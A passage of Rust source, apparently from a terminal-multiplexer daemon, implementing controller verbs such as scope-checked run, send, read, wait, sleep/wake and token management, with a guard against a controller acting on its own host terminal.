//! P5 controller verb dispatch (`C2D::Ctl` → `D2C::Ctl`).
//!
//! Every request is answered — success or a structured `Err { code, msg }` —
//! because agents need closure (unlike the legacy fire-and-forget GUI verbs).
//! Scope was resolved at the HelloCtl handshake and is enforced here through
//! `protocol::required_scope`; the recursion guard refuses input/lifecycle
//! verbs against the controller's own host terminal unless forced.
//!
//! Invariants honored (spec §0): controller bytes reach a PTY ONLY through
//! the session writer (mirror purity); reads never resize or reflow a session
//! (Attach's resize-to-client is a GUI-attach behavior); journal reads use
//! fresh handles via the existing `read_range`/`tail`; `waiters`/`subs`/
//! `ctl_tokens` are leaf locks.

use std::sync::atomic::Ordering;
use std::sync::Arc;

use alacritty_terminal::term::TermMode;
use uuid::Uuid;

use crate::protocol::{
    required_scope, CtlBody, CtlChord, CtlLastBlock, CtlOpenBlock, CtlRequest, CtlTerm,
    CtlTokenInfo, RunWait, WaitCond, WaitHit, D2C, SCOPE_FULL,
};
use crate::state::{TermKind, TermStatus};

use super::waiters::{
    deadline_from, first_close_at_or_after, Matcher, OutputWaiter, Sub, Waiter, WaiterKind,
    FROM_OFF_SCAN_CAP,
};
use super::{ctl_tokens, frame_bytes, now_ms, serialize, ClientConn, Core};

/// ReadTail line-count clamp.
const TAIL_MAX_LINES: u32 = 5000;

impl Core {
    pub(super) fn ctl_reply(&self, client: &ClientConn, req_id: u64, body: CtlBody) {
        if let Some(f) = frame_bytes(&D2C::Ctl { req_id, body }) {
            client.enqueue(&f);
        }
    }

    pub(super) fn ctl_err(&self, client: &ClientConn, req_id: u64, code: &str, msg: String) {
        self.ctl_reply(
            client,
            req_id,
            CtlBody::Err {
                code: code.into(),
                msg,
            },
        );
    }

    pub(super) fn handle_ctl(
        self: &Arc<Self>,
        client: &Arc<ClientConn>,
        req_id: u64,
        req: CtlRequest,
    ) {
        // Scope gate: one pure table, no verb ever forgets it.
        let need = required_scope(&req);
        if client.scope & need != need {
            let want = match need {
                x if x == SCOPE_FULL => "the master token",
                4 => "manage scope",
                2 => "input scope",
                _ => "read scope",
            };
            self.ctl_err(client, req_id, "forbidden", format!("requires {want}"));
            return;
        }
        // Recursion guard: an agent typing into (or killing) its own host
        // terminal is a feedback loop / mid-task suicide. Reads stay allowed.
        let self_hit = match &req {
            CtlRequest::Run { id, force_self, .. }
            | CtlRequest::SendRaw { id, force_self, .. }
            | CtlRequest::SendChord { id, force_self, .. }
            | CtlRequest::Kill { id, force_self }
            | CtlRequest::Restart { id, force_self }
            | CtlRequest::Delete { id, force_self }
            // SLEEP S10: `tc sleep` inside the terminal being slept kills
            // the caller mid-reply — Kill's exact self-harm class. Wake and
            // the folder verbs need no guard: an asleep terminal cannot
            // host the calling process.
            | CtlRequest::Sleep { id, force_self, .. } => {
                client.self_session == Some(*id) && !force_self
            }
            _ => false,
        };
        if self_hit {
            self.ctl_err(
                client,
                req_id,
                "self_target",
                "refusing to target the terminal this controller runs inside (pass --force-self to override)".into(),
            );
            return;
        }

        match req {
            CtlRequest::List => {
                let body = self.ctl_list();
                self.ctl_reply(client, req_id, body);
            }
            CtlRequest::CreateTerminal { spec } => {
                let id = self.create_terminal_inner(spec);
                self.ctl_reply(client, req_id, CtlBody::Created { id });
            }
            CtlRequest::CreateFolder { name } => {
                self.mutate(|s| {
                    let order = s.alloc_order();
                    s.folders.push(crate::state::Folder {
                        id: Uuid::new_v4(),
                        name,
                        collapsed: false,
                        order,
                        color_tag: None,
                    });
                });
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::Run {
                id,
                cmd,
                force,
                force_self: _,
                wait,
            } => self.ctl_run(client, req_id, id, cmd, force, wait),
            CtlRequest::SendRaw {
                id,
                bytes,
                force_self: _,
            } => match self.write_pty(id, &bytes) {
                Ok(()) => self.ctl_reply(client, req_id, CtlBody::Done),
                Err((code, msg)) => self.ctl_err(client, req_id, code, msg),
            },
            CtlRequest::SendChord {
                id,
                chord,
                force_self: _,
            } => {
                let win32 = self
                    .sessions
                    .lock()
                    .get(&id)
                    .map(|s| s.win32_input.load(Ordering::Relaxed))
                    .unwrap_or(false);
                let bytes = chord_bytes(chord, win32);
                match self.write_pty(id, &bytes) {
                    Ok(()) => self.ctl_reply(client, req_id, CtlBody::Done),
                    Err((code, msg)) => self.ctl_err(client, req_id, code, msg),
                }
            }
            CtlRequest::ReadScreen { id } => {
                let body = self.ctl_read_screen(id);
                self.ctl_reply(client, req_id, body);
            }
            CtlRequest::ReadTail { id, lines } => {
                let body = self.ctl_read_tail(id, lines);
                self.ctl_reply(client, req_id, body);
            }
            CtlRequest::ReadBlocks { id, last } => {
                if !self.term_exists(id) {
                    self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                    return;
                }
                let recs = {
                    let map = self.blocks.lock();
                    map.get(&id)
                        .map(|s| {
                            let n = (last as usize).min(s.recs.len());
                            s.recs[s.recs.len() - n..].to_vec()
                        })
                        .unwrap_or_default()
                };
                self.ctl_reply(client, req_id, CtlBody::Blocks { recs });
            }
            CtlRequest::ReadBlockText { id, start_off } => {
                let rec = self
                    .blocks
                    .lock()
                    .get(&id)
                    .and_then(|s| s.recs.iter().find(|r| r.start_off == start_off).cloned());
                match rec {
                    Some(rec) => {
                        let (text, truncated) = self.block_text(id, &rec);
                        self.ctl_reply(client, req_id, CtlBody::BlockText { text, truncated });
                    }
                    None => self.ctl_err(
                        client,
                        req_id,
                        "not_found",
                        format!("no block at offset {start_off}"),
                    ),
                }
            }
            CtlRequest::Wait {
                id,
                cond,
                timeout_ms,
            } => self.ctl_wait(client, req_id, id, cond, timeout_ms),
            CtlRequest::Kill { id, force_self: _ } => {
                if !self.term_exists(id) {
                    self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                    return;
                }
                self.cancel_reconnect(id);
                // Killer cloned under the sessions lock, TerminateProcess
                // outside it (the C2D::Input if-let-temporary class).
                let killer = self.sessions.lock().get(&id).map(|s| s.killer.clone_killer());
                match killer {
                    Some(mut k) => {
                        self.mark_expected_exit(id);
                        let _ = k.kill();
                        self.ctl_reply(client, req_id, CtlBody::Done);
                    }
                    None => self.ctl_err(client, req_id, "dead", "terminal is not running".into()),
                }
            }
            CtlRequest::Restart { id, force_self: _ } => {
                let status = self.state.lock().terminal(id).map(|t| t.status);
                match status {
                    None => self.ctl_err(client, req_id, "not_found", format!("no terminal {id}")),
                    Some(TermStatus::Running) => self.ctl_err(
                        client,
                        req_id,
                        "running",
                        "terminal is already running; kill it first".into(),
                    ),
                    Some(TermStatus::Dead) => {
                        // Conn-thread rule (remote-resume §6.2): a due probe
                        // moves the launch to a worker; Done then means
                        // "restart initiated" (poll status for the spawn).
                        self.launch_from_conn(id);
                        self.ctl_reply(client, req_id, CtlBody::Done);
                    }
                }
            }
            CtlRequest::Delete { id, force_self: _ } => {
                if !self.term_exists(id) {
                    self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                    return;
                }
                self.delete_terminal_inner(id);
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::Subscribe { ids, kinds } => {
                // Reply BEFORE inserting so Subscribed precedes the first
                // Event frame (events come from other threads).
                self.ctl_reply(client, req_id, CtlBody::Subscribed);
                self.push_sub(Sub {
                    client: Arc::downgrade(client),
                    req_id,
                    ids,
                    kinds,
                });
            }
            CtlRequest::Unsubscribe { req_id: sub_id } => {
                self.remove_sub(client, sub_id);
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::TokenCreate { name, scope } => {
                if name.trim().is_empty() {
                    self.ctl_err(client, req_id, "usage", "token name must not be empty".into());
                    return;
                }
                let scope = mint_scope_mask(scope);
                let token = ctl_tokens::mint();
                let info = CtlTokenInfo {
                    name: name.clone(),
                    token: token.clone(),
                    scope,
                    created_ms: now_ms(),
                };
                {
                    let mut file = self.ctl_tokens.lock();
                    match file.tokens.iter_mut().find(|t| t.name == name) {
                        Some(t) => *t = info, // upsert-by-name IS the rotation story
                        None => file.tokens.push(info),
                    }
                    ctl_tokens::save(&file);
                }
                log::info!("controller token '{name}' created (scope {scope})");
                self.ctl_reply(client, req_id, CtlBody::Token { name, token, scope });
            }
            CtlRequest::TokenRevoke { name } => {
                {
                    let mut file = self.ctl_tokens.lock();
                    file.tokens.retain(|t| t.name != name);
                    ctl_tokens::save(&file);
                }
                log::info!("controller token '{name}' revoked");
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::TokenList => {
                let list = self.ctl_tokens.lock().tokens.clone();
                self.ctl_reply(client, req_id, CtlBody::Tokens { list });
            }

            // SLEEP (proto 9, S6): the controller flavor carries the
            // refusal semantics C2D doesn't (§2.2 lifecycle table).
            CtlRequest::Sleep {
                id,
                force,
                force_self: _,
            } => {
                let st = self.state.lock().terminal(id).map(|t| (t.status, t.asleep));
                match st {
                    None => {
                        self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"))
                    }
                    Some((TermStatus::Dead, true)) => self.ctl_err(
                        client,
                        req_id,
                        "asleep",
                        "terminal is already asleep".into(),
                    ),
                    Some((TermStatus::Running, true)) => self.ctl_err(
                        client,
                        req_id,
                        "asleep",
                        "terminal is already falling asleep".into(),
                    ),
                    Some((TermStatus::Dead, false)) => self.ctl_err(
                        client,
                        req_id,
                        "dead",
                        "terminal is dead; sleep suspends a running terminal".into(),
                    ),
                    Some((TermStatus::Running, false)) => {
                        // Spawn in flight: Running is set at spawn, the
                        // session lands in the map moments later — refuse
                        // rather than flag a terminal whose kill would miss.
                        if !self.sessions.lock().contains_key(&id) {
                            self.ctl_err(
                                client,
                                req_id,
                                "not_running",
                                "terminal is still launching; retry in a moment".into(),
                            );
                            return;
                        }
                        if !force {
                            if let Some(evidence) = self.sleep_busy_evidence(id) {
                                self.ctl_err(
                                    client,
                                    req_id,
                                    "busy",
                                    format!("{evidence}; pass --force to sleep anyway"),
                                );
                                return;
                            }
                        }
                        // Inline on this controller conn thread (S19): only
                        // the caller waits out the drain; Done lands after
                        // the kill is issued.
                        self.sleep_terminals(&[id]);
                        self.ctl_reply(client, req_id, CtlBody::Done);
                    }
                }
            }
            CtlRequest::Wake { id } => {
                let st = self.state.lock().terminal(id).map(|t| (t.status, t.asleep));
                match st {
                    None => {
                        self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"))
                    }
                    Some((TermStatus::Dead, true)) => {
                        // Same conn-thread rule as Restart (wake IS launch).
                        self.launch_from_conn(id);
                        self.ctl_reply(client, req_id, CtlBody::Done);
                    }
                    Some((TermStatus::Running, true)) => self.ctl_err(
                        client,
                        req_id,
                        "sleeping",
                        "terminal is still falling asleep; retry in a moment".into(),
                    ),
                    Some((status, false)) => self.ctl_err(
                        client,
                        req_id,
                        "not_asleep",
                        format!(
                            "terminal is {}, not asleep{}",
                            if status == TermStatus::Running { "running" } else { "dead" },
                            if status == TermStatus::Dead { " (use restart)" } else { "" },
                        ),
                    ),
                }
            }
            CtlRequest::SleepFolder { folder, force } => {
                if !self.state.lock().folders.iter().any(|f| f.id == folder) {
                    self.ctl_err(client, req_id, "not_found", format!("no folder {folder}"));
                    return;
                }
                let members = self.folder_sleep_members(folder);
                // Without --force, busy members are SKIPPED (logged), never
                // silently killed — the CLI's honest bulk form; the GUI's
                // confirm modal is the force spelling (§8.1). Empty sets are
                // no-ops, not errors (bulk idempotence).
                let targets: Vec<Uuid> = if force {
                    members
                } else {
                    members
                        .into_iter()
                        .filter(|id| match self.sleep_busy_evidence(*id) {
                            Some(evidence) => {
                                log::info!("sleep folder: skipping busy {id}: {evidence}");
                                false
                            }
                            None => true,
                        })
                        .collect()
                };
                self.sleep_terminals(&targets);
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::WakeFolder { folder } => {
                if !self.state.lock().folders.iter().any(|f| f.id == folder) {
                    self.ctl_err(client, req_id, "not_found", format!("no folder {folder}"));
                    return;
                }
                let members = self.folder_wake_members(folder);
                // Staggered daemon-side (S17); Done immediately — the wake
                // is async and visibly progressive, poll List to settle.
                self.wake_staggered(members);
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
            CtlRequest::ReportCliSession {
                id,
                adapter,
                event,
                source,
                session_id,
            } => {
                // Attribution Layer 2: a CLI hook self-reporting its live
                // session id. Non-claude adapters are acknowledged and
                // ignored (forward-compat: an old daemon must never guess
                // at a future CLI's identity rules).
                if !self.term_exists(id) {
                    self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                    return;
                }
                let Ok(sid) = uuid::Uuid::parse_str(session_id.trim()) else {
                    self.ctl_err(
                        client,
                        req_id,
                        "bad_session",
                        "session_id is not uuid-shaped".into(),
                    );
                    return;
                };
                if (adapter == "claude" || adapter == "codex") && event == "SessionStart" {
                    // claude Layer 2 (`tc __claude-hook`) and codex Layer 2
                    // (`tc __codex-hook`, the Windows-native lane where the
                    // hook inherits TC_SESSION_ID and reads session_id off
                    // stdin) both land here. apply_cli_session's adapter gate
                    // routes each to the matching inner_cli / pin.
                    if self.apply_cli_session(id, &adapter, sid, "hook report") {
                        self.broadcast_snapshot();
                    }
                } else {
                    // claude SessionEnd(clear|resume) = the transient half of a
                    // switch (the paired Start lands ~200ms later);
                    // SessionEnd(other) = the CLI exiting — the exit/block
                    // lifecycle owns any clearing. A future/unknown adapter is
                    // acknowledged and ignored (forward-compat). Observe, never
                    // mutate.
                    log::debug!(
                        "terminal {id}: {adapter} {event} (source={source}) observed"
                    );
                }
                self.ctl_reply(client, req_id, CtlBody::Done);
            }
        }
    }

    fn term_exists(&self, id: Uuid) -> bool {
        self.state.lock().terminal(id).is_some()
    }

    /// Bytes to the PTY via the session writer — the exact `C2D::Input` path,
    /// nothing else (mirror purity).
    fn write_pty(&self, id: Uuid, bytes: &[u8]) -> Result<(), (&'static str, String)> {
        // SLEEP S9: input never wakes — an INPUT-scoped token must not be
        // able to spawn processes, and a typo'd send must not resume a
        // 450MB claude tree. The refusal names the fix. Checked on the flag
        // alone so the sub-second Sleeping transient refuses too.
        let asleep = self.state.lock().terminal(id).map(|t| t.asleep);
        match asleep {
            None => return Err(("not_found", format!("no terminal {id}"))),
            Some(true) => {
                return Err(("asleep", "terminal is asleep; wake it first (tc wake)".into()))
            }
            Some(false) => {}
        }
        let writer = self.sessions.lock().get(&id).map(|s| s.writer.clone());
        match writer {
            Some(w) => {
                use std::io::Write;
                // r2-F7: a broken/full pipe (session dying mid-request) must
                // not be answered Done — the controller was promised the
                // bytes arrived.
                let mut w = w.lock();
                w.write_all(bytes)
                    .and_then(|()| w.flush())
                    .map_err(|e| ("io", format!("pty write failed: {e}")))
            }
            None => Err(("dead", "terminal is not running".into())),
        }
    }

    /// §5.1 List: O(terminals), sequenced short locks (state → sessions →
    /// blocks), no journal IO, no term locks. Safe at any call frequency.
    fn ctl_list(&self) -> CtlBody {
        let now = now_ms();
        let (folders, metas) = {
            let s = self.state.lock();
            (s.folders.clone(), s.terminals.clone())
        };
        let idle: std::collections::HashMap<Uuid, u64> = {
            let sessions = self.sessions.lock();
            sessions
                .iter()
                .map(|(id, s)| {
                    (
                        *id,
                        now.saturating_sub(s.last_output.load(Ordering::Relaxed)),
                    )
                })
                .collect()
        };
        struct BlockView {
            hooked: bool,
            open: Option<CtlOpenBlock>,
            last: Option<CtlLastBlock>,
        }
        let blocks: std::collections::HashMap<Uuid, BlockView> = {
            let map = self.blocks.lock();
            map.iter()
                .map(|(id, s)| {
                    let open = s.open.and_then(|i| s.recs.get(i)).map(|r| CtlOpenBlock {
                        cmd: r.cmd.clone(),
                        started_ms: r.started_ms,
                    });
                    let last = s
                        .recs
                        .iter()
                        .rev()
                        .find(|r| r.end_off.is_some())
                        .map(|r| CtlLastBlock {
                            cmd: r.cmd.clone(),
                            exit: r.exit,
                            ended_ms: r.ended_ms,
                        });
                    (
                        *id,
                        BlockView {
                            hooked: s.epoch > 0,
                            open,
                            last,
                        },
                    )
                })
                .collect()
        };
        let terminals = metas
            .into_iter()
            .map(|t| {
                // SLEEP S18/Q4: presented-status strings — the status field
                // is an open string enum, JSON-additive. "sleeping" is the
                // observable sub-second drain transient; idle_ms only means
                // something for a presented-Running terminal.
                let presented = crate::state::presented_status(t.status, t.asleep);
                let running = presented == crate::state::PresentedStatus::Running;
                let idle_ms = if running { idle.get(&t.id).copied() } else { None };
                // The GUI's Working threshold (800ms since last output), so
                // one activity definition holds across surfaces; raw idle_ms
                // rides along for consumers with different thresholds.
                let activity = match presented {
                    crate::state::PresentedStatus::Asleep
                    | crate::state::PresentedStatus::Sleeping => "asleep",
                    crate::state::PresentedStatus::Dead => "dead",
                    crate::state::PresentedStatus::Running => {
                        if idle_ms.is_some_and(|ms| ms < 800) {
                            "working"
                        } else {
                            "idle"
                        }
                    }
                };
                let status = match presented {
                    crate::state::PresentedStatus::Running => "running",
                    crate::state::PresentedStatus::Sleeping => "sleeping",
                    crate::state::PresentedStatus::Asleep => "asleep",
                    // SSH auto-reconnect supervision active: the between-
                    // attempt Dead is a transient (open string enum,
                    // JSON-additive — consumers unaware of it see a new
                    // string, not a broken field).
                    crate::state::PresentedStatus::Dead if t.reconnecting => "reconnecting",
                    crate::state::PresentedStatus::Dead => "dead",
                };
                let (kind, claude_session) = match &t.kind {
                    TermKind::Claude { session_id, .. } => ("claude", Some(*session_id)),
                    TermKind::Shell => ("shell", None),
                    TermKind::Custom => ("custom", None),
                };
                let bv = blocks.get(&t.id);
                // v0.1.1: the shared display rule — POSIX-namespace sessions
                // (WSL/ssh) never report a `C:\` cwd string.
                let cwd = t.display_cwd();
                CtlTerm {
                    id: t.id,
                    name: t.name,
                    folder: t.folder,
                    kind: kind.into(),
                    claude_session,
                    inner_cli: t.inner_cli,
                    program: t.program,
                    cwd,
                    status: status.into(),
                    activity: activity.into(),
                    idle_ms,
                    cols: t.last_cols,
                    rows: t.last_rows,
                    hooked: bv.is_some_and(|b| b.hooked),
                    open_block: bv.and_then(|b| b.open.clone()),
                    last_block: bv.and_then(|b| b.last.clone()),
                }
            })
            .collect();
        CtlBody::Listing { folders, terminals }
    }

    /// §5.3 Run — the gated submission (each refusal a distinct code so
    /// agents can branch).
    fn ctl_run(
        self: &Arc<Self>,
        client: &Arc<ClientConn>,
        req_id: u64,
        id: Uuid,
        cmd: String,
        force: bool,
        wait: Option<RunWait>,
    ) {
        if !self.term_exists(id) {
            self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
            return;
        }
        let (status, asleep) = match self.state.lock().terminal(id).map(|t| (t.status, t.asleep)) {
            Some(pair) => pair,
            None => {
                self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                return;
            }
        };
        // SLEEP S9: run never auto-wakes (inv. 5) — the refusal names the fix.
        if asleep {
            self.ctl_err(
                client,
                req_id,
                "asleep",
                "terminal is asleep; wake it first (tc wake)".into(),
            );
            return;
        }
        if status != TermStatus::Running {
            self.ctl_err(client, req_id, "dead", "terminal is not running".into());
            return;
        }
        // Multi-line refused: on PSReadLine each \r is a SEPARATE submission —
        // one exit code for N commands would be a silent lie. The CLI's
        // --multi converts \n to \r deliberately (documented: wait resolves
        // on the FIRST close), so \r here is the sanctioned multi form.
        if cmd.contains('\n') {
            self.ctl_err(
                client,
                req_id,
                "multiline",
                "multi-line command refused: each line is a separate submission; pass --multi to send anyway (wait resolves on the first block)".into(),
            );
            return;
        }
        // P6b: Cmd-family terminals get the submission ledger — the write is
        // ALSO recorded as a synthetic block (opened below at at_off, closed
        // by the next token-checked pre; exit None) so `tc run` on cmd yields
        // a real RunStarted/RunDone.
        let cmd_family = self.is_cmd_family(id);
        // The busy/hooked gate (P3's gate core, daemon flavor). --force skips
        // it entirely — send/chords are the raw escape hatch, run --force the
        // explicit one.
        if !force {
            let (hooked, live, open) = {
                let map = self.blocks.lock();
                match map.get(&id) {
                    Some(s) => (
                        s.epoch > 0,
                        s.hooks_live,
                        s.open.and_then(|i| s.recs.get(i)).map(|r| (r.cmd.clone(), r.started_ms)),
                    ),
                    None => (false, false, None),
                }
            };
            if !hooked {
                self.ctl_err(
                    client,
                    req_id,
                    "not_hooked",
                    "terminal has no shell hooks (claude/cmd/custom); use send/read --screen for TUIs".into(),
                );
                return;
            }
            if !live {
                self.ctl_err(
                    client,
                    req_id,
                    "hooks_unverified",
                    "the shell bootstrap never reported in this spawn; the busy gate would be blind — refusing rather than guessing".into(),
                );
                return;
            }
            if let Some((open_cmd, started)) = open {
                let dur = now_ms().saturating_sub(started) / 1000;
                self.ctl_err(
                    client,
                    req_id,
                    "busy",
                    format!("{open_cmd} running for {dur}s; pass --force to type into it"),
                );
                return;
            }
            // Alt-screen check: clone the term Arc out of the sessions lock
            // (Attach's pattern), bounded mirror read.
            let term = self.sessions.lock().get(&id).map(|s| s.term.clone());
            if let Some(term) = term {
                if serialize::is_alt_screen(&term.lock()) {
                    self.ctl_err(
                        client,
                        req_id,
                        "alt_screen",
                        "a full-screen app is active; use send for raw input".into(),
                    );
                    return;
                }
            }
            // D14 (P6b §5.3): for Cmd family, "no open block" is vacuous for
            // TYPED commands (no exec hook ever opens one), so the gate
            // additionally requires the strongest honest evidence — mirror
            // cursor exactly at the latched prompt-end column AND the
            // session output-quiet ≥300ms. A running `ping -t` fails both.
            if cmd_family && !self.cmd_prompt_evidence(id) {
                self.ctl_err(
                    client,
                    req_id,
                    "busy",
                    "cmd has no exec hook: no at-prompt evidence (cursor off the prompt end, or output within 300ms); pass --force to type anyway".into(),
                );
                return;
            }
        }
        // Submission bytes, daemon flavor: the mirror is the ground truth for
        // BRACKETED_PASTE (PSReadLine 2.0 renders literal ESC[200~ as junk).
        let bracketed = self
            .sessions
            .lock()
            .get(&id)
            .map(|s| s.term.clone())
            .is_some_and(|t| t.lock().mode().contains(TermMode::BRACKETED_PASTE));
        let bytes = submission_bytes(bracketed, &cmd);
        // at_off BEFORE the write: the echo/exec hook needs a conhost round
        // trip, so everything this submission causes lands >= at_off. No
        // journal write happens here (input is not output — mirror purity).
        let at_off = match self.journal(id) {
            Ok(j) => j.lock().absolute_len(),
            Err(_) => {
                self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
                return;
            }
        };
        if let Err((code, msg)) = self.write_pty(id, &bytes) {
            self.ctl_err(client, req_id, code, msg);
            return;
        }
        // P6b: the synthetic block IS the run's record for exec-less shells —
        // opened at the pre-write head, closed by the next pre (the BlockClose
        // waiter below resolves on it; RunDone.exit = None, honest).
        if cmd_family {
            self.open_synthetic(id, cmd.clone(), at_off);
        }
        match wait {
            None => self.ctl_reply(client, req_id, CtlBody::RunStarted { at_off }),
            Some(w) => {
                // Immediate check covers a close racing the registration.
                let hit = {
                    let map = self.blocks.lock();
                    map.get(&id)
                        .and_then(|s| first_close_at_or_after(&s.recs, at_off).cloned())
                };
                if let Some(rec) = hit {
                    let body = self.run_done_body(id, &rec, w.tail_bytes);
                    self.ctl_reply(client, req_id, body);
                    return;
                }
                let waiter = Waiter {
                    client: Arc::downgrade(client),
                    req_id,
                    id,
                    deadline_ms: deadline_from(w.timeout_ms),
                    kind: WaiterKind::BlockClose {
                        after_off: at_off,
                        run_tail: Some(w.tail_bytes),
                    },
                };
                if let Err(code) = self.push_waiter(waiter) {
                    self.ctl_err(client, req_id, code, "too many pending waits".into());
                } else {
                    // L-10: a close racing the registration resolves nothing
                    // for a not-yet-listed waiter — re-check now it is listed.
                    self.recheck_block_close_after_push(client, req_id, id, at_off);
                }
            }
        }
    }

    /// §6.2 Wait registration with immediate-resolution checks (never park a
    /// waiter on a condition that is already true or can never fire).
    fn ctl_wait(
        self: &Arc<Self>,
        client: &Arc<ClientConn>,
        req_id: u64,
        id: Uuid,
        cond: WaitCond,
        timeout_ms: u64,
    ) {
        if !self.term_exists(id) {
            self.ctl_err(client, req_id, "not_found", format!("no terminal {id}"));
            return;
        }
        let running = self.state.lock().terminal(id).map(|t| t.status) == Some(TermStatus::Running);
        let deadline_ms = deadline_from(timeout_ms);
        let kind = match cond {
            WaitCond::Prompt => {
                let (hooked, live, open_none) = {
                    let map = self.blocks.lock();
                    match map.get(&id) {
                        Some(s) => (s.epoch > 0, s.hooks_live, s.open.is_none()),
                        None => (false, false, true),
                    }
                };
                if !running {
                    self.ctl_err(client, req_id, "dead", "terminal is not running".into());
                    return;
                }
                if !hooked {
                    self.ctl_err(
                        client,
                        req_id,
                        "not_hooked",
                        "prompt waits need shell hooks; this terminal has none".into(),
                    );
                    return;
                }
                if !live {
                    self.ctl_err(
                        client,
                        req_id,
                        "hooks_unverified",
                        "the shell bootstrap never reported in this spawn".into(),
                    );
                    return;
                }
                if open_none {
                    self.ctl_reply(client, req_id, CtlBody::Waited { hit: WaitHit::Prompt });
                    return;
                }
                WaiterKind::Prompt
            }
            WaitCond::Exit => {
                if !running {
                    // Historical exits don't keep codes — the honest None.
                    self.ctl_reply(
                        client,
                        req_id,
                        CtlBody::Waited {
                            hit: WaitHit::Exited { code: None },
                        },
                    );
                    return;
                }
                WaiterKind::Exit
            }
            WaitCond::BlockClose { after_off } => {
                let hit = {
                    let map = self.blocks.lock();
                    map.get(&id)
                        .and_then(|s| first_close_at_or_after(&s.recs, after_off).cloned())
                };
                if let Some(rec) = hit {
                    self.ctl_reply(
                        client,
                        req_id,
                        CtlBody::Waited {
                            hit: WaitHit::BlockClosed { rec },
                        },
                    );
                    return;
                }
                WaiterKind::BlockClose {
                    after_off,
                    run_tail: None,
                }
            }
            WaitCond::OutputMatch {
                pattern,
                regex,
                from_off,
            } => {
                let matcher = if regex {
                    match regex::bytes::Regex::new(&pattern) {
                        Ok(r) => Matcher::Regex(r),
                        Err(e) => {
                            self.ctl_err(client, req_id, "bad_pattern", format!("{e}"));
                            return;
                        }
                    }
                } else {
                    if pattern.is_empty() {
                        self.ctl_err(client, req_id, "bad_pattern", "empty pattern".into());
                        return;
                    }
                    Matcher::Substring(pattern)
                };
                let mut ow = OutputWaiter::new(matcher);
                if let Some(off) = from_off {
                    // History scan first: bytes already journaled since `off`
                    // (stripper + buffer keep their state, so a pattern split
                    // across the history/live boundary still matches). The
                    // scan walks the WHOLE [off, head) range in cap-sized
                    // windows (r2-F5a: one read_range clips to the FIRST
                    // 512KB — a `cargo build` between run and wait would put
                    // the match in a never-scanned gap). `fed_to` records how
                    // far this waiter has seen, so the live feed and the
                    // post-push recheck can never double-feed a byte.
                    let mut hit = None;
                    if let Ok(j) = self.journal(id) {
                        // Each window is READ under the journal lock but fed
                        // (stripper + regex) outside it, so a full-journal
                        // scan never stalls this terminal's ingest/attach
                        // for tens of ms (r3-F7). `fed_to` advances with the
                        // scan; the head is re-read per window, and anything
                        // appended after the last window is covered by the
                        // post-push recheck below.
                        let mut from = {
                            let j = j.lock();
                            off.min(j.absolute_len())
                        };
                        loop {
                            let chunk = {
                                let j = j.lock();
                                let head = j.absolute_len();
                                if from >= head {
                                    break;
                                }
                                let (chunk, _) = j.read_range(from, head, FROM_OFF_SCAN_CAP);
                                chunk
                            };
                            if chunk.is_empty() {
                                break;
                            }
                            from += chunk.len() as u64;
                            ow.fed_to = from;
                            if let Some(line) = ow.feed(&chunk) {
                                hit = Some((line, from));
                                break;
                            }
                        }
                        ow.fed_to = ow.fed_to.max(from);
                    }
                    if let Some((line, at_off)) = hit {
                        self.ctl_reply(
                            client,
                            req_id,
                            CtlBody::Waited {
                                hit: WaitHit::Output { line, at_off },
                            },
                        );
                        return;
                    }
                }
                WaiterKind::Output(ow)
            }
        };
        // Remember what to re-check once the waiter is actually listed
        // (L-10: the immediate checks above and push_waiter share no lock —
        // EVERY kind gets a post-push recheck, r2-F4/F5b closed the Exit and
        // Output gaps).
        let recheck_close = match &kind {
            WaiterKind::BlockClose { after_off, .. } => Some(*after_off),
            _ => None,
        };
        let recheck_prompt = matches!(kind, WaiterKind::Prompt);
        let recheck_exit = matches!(kind, WaiterKind::Exit);
        let recheck_output = matches!(kind, WaiterKind::Output(_));
        let waiter = Waiter {
            client: Arc::downgrade(client),
            req_id,
            id,
            deadline_ms,
            kind,
        };
        if let Err(code) = self.push_waiter(waiter) {
            self.ctl_err(client, req_id, code, "too many pending waits".into());
            return;
        }
        if let Some(after_off) = recheck_close {
            self.recheck_block_close_after_push(client, req_id, id, after_off);
        } else if recheck_prompt {
            self.recheck_prompt_after_push(client, req_id, id);
        } else if recheck_exit {
            self.recheck_exit_after_push(client, req_id, id);
        } else if recheck_output {
            self.recheck_output_after_push(client, req_id, id);
        }
    }

    /// §5.5 ReadScreen: the visible grid as text. One term lock, bounded walk
    /// (rows ≤ 1000 by the resize clamp); never resizes, never serializes VT.
    fn ctl_read_screen(&self, id: Uuid) -> CtlBody {
        use alacritty_terminal::grid::Dimensions;
        use alacritty_terminal::index::{Column, Line};
        use alacritty_terminal::term::cell::Flags;

        if !self.term_exists(id) {
            return CtlBody::Err {
                code: "not_found".into(),
                msg: format!("no terminal {id}"),
            };
        }
        let term = self.sessions.lock().get(&id).map(|s| s.term.clone());
        let Some(term) = term else {
            return CtlBody::Err {
                code: "dead".into(),
                msg: "terminal is not running; use read --tail for its journal".into(),
            };
        };
        let t = term.lock();
        let (cols, rows) = (t.columns(), t.screen_lines());
        let mut lines = Vec::with_capacity(rows);
        for r in 0..rows {
            let row = &t.grid()[Line(r as i32)];
            let mut s = String::with_capacity(cols);
            for c in 0..cols {
                let cell = &row[Column(c)];
                if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                    continue;
                }
                s.push(cell.c);
            }
            lines.push(s.trim_end().to_string());
        }
        let cur = t.grid().cursor.point;
        let alt = serialize::is_alt_screen(&t);
        CtlBody::Screen {
            lines,
            cursor_row: cur.line.0.max(0) as u16,
            cursor_col: cur.column.0 as u16,
            alt_screen: alt,
        }
    }

    /// §5.5 ReadTail: last `lines` complete journal lines, stripped. Works
